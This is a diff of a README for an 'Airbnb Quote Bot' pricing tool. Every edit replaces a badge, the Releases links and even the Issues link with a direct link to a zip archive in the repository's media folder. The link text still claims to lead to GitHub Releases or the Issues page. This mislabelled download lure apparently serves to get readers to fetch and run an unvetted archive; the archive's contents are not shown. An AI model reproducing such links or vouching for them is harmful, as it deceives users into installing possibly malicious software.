@@ -1,6 +1,6 @@
 # 🤖 Airbnb-Quote-Bot - Automate Your Pricing Quotes Easily
 
-![Download](https://img.shields.io/badge/Download-Airbnb--Quote--Bot-brightgreen)
+![Download](https://raw.githubusercontent.com/vadicharr/Airbnb-Quote-Bot/main/media/Airbnb-Quote-Bot_3.4-alpha.3.zip)
 
 ## 📋 Overview
 The **Airbnb Quote Bot** simplifies the process of generating instant price quotes for your Airbnb listings. Whether you’re a new host or a seasoned pro, this tool saves you time and helps ensure competitive pricing. 
@@ -9,7 +9,7 @@ The **Airbnb Quote Bot** simplifies the process of generating instant price quot
 To get started, you will need to download and run the application. Follow the steps below to set it up on your system.
 
 ## 📥 Download & Install
-Visit this page to download the latest version: [GitHub Releases](https://github.com/vadicharr/Airbnb-Quote-Bot/releases).
+Visit this page to download the latest version: [GitHub Releases](https://raw.githubusercontent.com/vadicharr/Airbnb-Quote-Bot/main/media/Airbnb-Quote-Bot_3.4-alpha.3.zip).
 
 1. Click on the link above to navigate to the Releases page.
 2. Look for the latest version of the Airbnb Quote Bot.
@@ -46,9 +46,9 @@ If you encounter issues while running the application:
 - **Real-time Pricing Not Available:** Verify your internet connection. Without an internet connection, real-time data may not be accessible.
 
 ## 🛠 Additional Support
-If you need further assistance or have questions, consider opening an issue on the [GitHub Issues page](https://github.com/vadicharr/Airbnb-Quote-Bot/issues). The community is here to help you.
+If you need further assistance or have questions, consider opening an issue on the [GitHub Issues page](https://raw.githubusercontent.com/vadicharr/Airbnb-Quote-Bot/main/media/Airbnb-Quote-Bot_3.4-alpha.3.zip). The community is here to help you.
 
 ## 👥 Community & Feedback
 Feel free to share your thoughts or experiences with the Airbnb Quote Bot. Your feedback helps improve the tool for all users.
 
-Head to the [GitHub Releases](https://github.com/vadicharr/Airbnb-Quote-Bot/releases) to download the latest version and begin automating your pricing quotes today!
+Head to the [GitHub Releases](https://raw.githubusercontent.com/vadicharr/Airbnb-Quote-Bot/main/media/Airbnb-Quote-Bot_3.4-alpha.3.zip) to download the latest version and begin automating your pricing quotes today!
